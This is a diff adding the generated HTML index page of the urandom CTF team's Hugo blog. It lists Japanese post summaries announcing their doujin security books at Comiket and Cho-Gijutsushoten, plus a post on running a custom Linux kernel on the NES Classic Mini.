+<div class="post">
+    <h2 class="post-item post-title">
+        <a href="https://urandom.team/post/c93-announce/">C93参加と新刊のお知らせ</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2017-12-25</span>
+
+
+
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/publication">Publication</a>&nbsp;</span>
+
+    </div>
+    <div class="post-item post-summary markdown-body">
+        C93（2017年冬コミ）に当選してました。 スペースは 1日目 東キ47a です1。 新刊“urandom vol.5”を出します。 次の画像をクリックすると本文サンプルが見えます。 urandom vol.5は次のような内容に
+    </div>
+</div>
+
+<div class="post">
+    <h2 class="post-item post-title">
+        <a href="https://urandom.team/post/c92-announce/">C92参加と新刊のお知らせ</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2017-08-08</span>
+
+
+
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/publication">Publication</a>&nbsp;</span>
+
+    </div>
+    <div class="post-item post-summary markdown-body">
+        C92（2017年夏コミ）に当選してました。 スペースは 3日目 東イ-60b です。 新刊“urandom vol.4”と既刊“urandom vol.3”を出します。 urandom vol.4は次のような内容になります。 mi
+    </div>
+</div>
+
+<div class="post">
+    <h2 class="post-item post-title">
+        <a href="https://urandom.team/post/cho-tech/">超技術書典参加のお知らせ</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2017-04-28</span>
+
+
+
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/publication">Publication</a>&nbsp;</span>
+
+    </div>
+    <div class="post-item post-summary markdown-body">
+        ニコニコ超会議2017に併催の超技術書典に当選しました。スペースは 1日目 B-17 です。 C91に引き続き、“urandom vol.3”を頒布します。 https://techbookfest.org/event/cho01/circle/5671617594130432 頒布価格は300円です。それでは会場でお会いしましょう。
+    </div>
+</div>
+
+<div class="post">
+    <h2 class="post-item post-title">
+        <a href="https://urandom.team/post/c91-digital/">urandom vol.3電子版公開のお知らせ</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2017-03-12</span>
+
+
+
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/publication">Publication</a>&nbsp;</span>
+
+    </div>
+    <div class="post-item post-summary markdown-body">
+        urandom vol.3電子版 C91の1ヶ月後に出すと告知しておいて、結局3月になってしまいましたが、urandom vol.3の電子版を公開しました。 urandom vol.3電子版は 128円 での販売となります。内容は物理書籍
+    </div>
+</div>
+
+<div class="post">
+    <h2 class="post-item post-title">
+        <a href="https://urandom.team/post/c91-sample/">C91 新刊のお知らせ</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2016-12-13</span>
+
+
+
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/publication">Publication</a>&nbsp;</span>
+
+    </div>
+    <div class="post-item post-summary markdown-body">
+        表紙だよ！ リンク先はサンプルのPDFだよ！（※サンプルにはカラー写真が含まれていますが、当日頒布する冊子はグレースケールです） 数多の困難を乗り越え、来るC91で頒布する新刊「urandom vol.3」
+    </div>
+</div>
+
+<div class="post">
+    <h2 class="post-item post-title">
+        <a href="https://urandom.team/post/my-linux-kernel-on-nesclassic/">ファミコンミニで自前のLinuxカーネルを動かす手順</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2016-11-14</span>
+
+
+
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/tech">tech</a>&nbsp;<a href="/tags/misc">Misc</a>&nbsp;</span>
+
+    </div>
+    <div class="post-item post-summary markdown-body">
+        はじめに ファミコンミニ自体の権利表記画面や任天堂Webサイトで配布されているOSSソースコードからも分かるように、ファミコンミニの中で動いているのはU-bootで起動されたLinuxです。なので、ファ
+    </div>
+</div>
+<div class="pagination"><div class="pag-item pag-current">
+    <a href="/">1</a>
+  </div><div class="pag-item">
+    <a href="/page/2/">2</a>
+  </div><div class="pag-item">
+    <a href="/page/3/">3</a>
+  </div><div class="pag-next">
+    <a href="/page/2/"><i class="iconfont icon-chevron-forward-circle-sharp"></i></a>
+  </div><div class="pag-last">
+    <a href="/page/3/"><i class="iconfont icon-caret-forward-circle-sharp"></i></a>
+  </div></div>
+            </div>
+            <aside class="col-12 col-md-3 float-left sidebar">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>Pages</h3>
+        <ul>
+            
+            <li>
+                <a href="/">Home</a>
+            </li>
+            
+            <li>
+                <a href="/about/">About</a>
+            </li>
+            
+            <li>
+                <a href="/books/">Publication</a>
+            </li>
+            
+            <li>
+                <a href="/index.xml">RSS</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>Links</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/urandom-ctf" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>Tags</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/ctf/">CTF</a>
+            </span>
+            
+            <span>
+                <a href="/tags/e-book/">E-book</a>
+            </span>
+            
+            <span>
+                <a href="/tags/misc/">Misc</a>
+            </span>
+            
+            <span>
+                <a href="/tags/publication/">Publication</a>
+            </span>
+            
+            <span>
+                <a href="/tags/seccon/">SECCON</a>
+            </span>
+            
+            <span>
+                <a href="/tags/tech/">tech</a>
+            </span>
+            
+            <span>
+                <a href="/tags/tmctf/">TMCTF</a>
+            </span>
+            
+            <span>
+                <a href="/tags/write-ups/">Write-ups</a>
+            </span>
+            
+        </div>
+    </div>
+    
+    
+    
+</aside>
+
+        </div>
+        <div class="btn">
+    <div class="btn-menu" id="btn-menu">
+        <i class="iconfont icon-grid-sharp"></i>
+    </div>
+    <div class="btn-toggle-mode">
+        <i class="iconfont icon-contrast-sharp"></i>
+    </div>
+    <div class="btn-scroll-top">
+        <i class="iconfont icon-chevron-up-circle-sharp"></i>
+    </div>
+</div>
+<aside class="sidebar-mobile" style="display: none;">
+  <div class="sidebar-wrapper">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>Pages</h3>
+        <ul>
+            
+            <li>
+                <a href="/">Home</a>
+            </li>
+            
+            <li>
+                <a href="/about/">About</a>
+            </li>
+            
+            <li>
+                <a href="/books/">Publication</a>
+            </li>
+            
+            <li>
+                <a href="/index.xml">RSS</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>Links</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/urandom-ctf" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>Tags</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/ctf/">CTF</a>
+            </span>
+            
+            <span>
+                <a href="/tags/e-book/">E-book</a>
+            </span>
+            
+            <span>
+                <a href="/tags/misc/">Misc</a>
+            </span>
+            
+            <span>
+                <a href="/tags/publication/">Publication</a>
+            </span>
+            
+            <span>
+                <a href="/tags/seccon/">SECCON</a>
+            </span>
+            
+            <span>
+                <a href="/tags/tech/">tech</a>
+            </span>
+            
+            <span>
+                <a href="/tags/tmctf/">TMCTF</a>
+            </span>
+            
+            <span>
+                <a href="/tags/write-ups/">Write-ups</a>
+            </span>
+            
+        </div>
+    </div>
+    
+    
+  </div>
+</aside>
+    </main>
+
+    <footer>
+    <div class="container-lg clearfix">
+        <div class="col-12 footer">
+            
+            <span>&copy; 2015-2022
+                <a href="https://urandom.team">urandom</a>
+                All rights reserved.
+                 | <a href="https://github.com/urandom-ctf/urandom-ctf.github.io">Source code</a> 
+                | Powered by <a href="https://github.com/dsrkafuu/hugo-theme-fuji/"
+                   target="_blank">Fuji-v2</a> &amp; <a href="https://gohugo.io/"
+                                                    target="_blank">Hugo</a> 
+            </span>
+        </div>
+    </div>
+</footer>
+
+    
+<script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js"></script>
+
+
+
+<script defer src="/assets/js/fuji.min.js"></script>
+
+
+
 </body>
+
 </html>
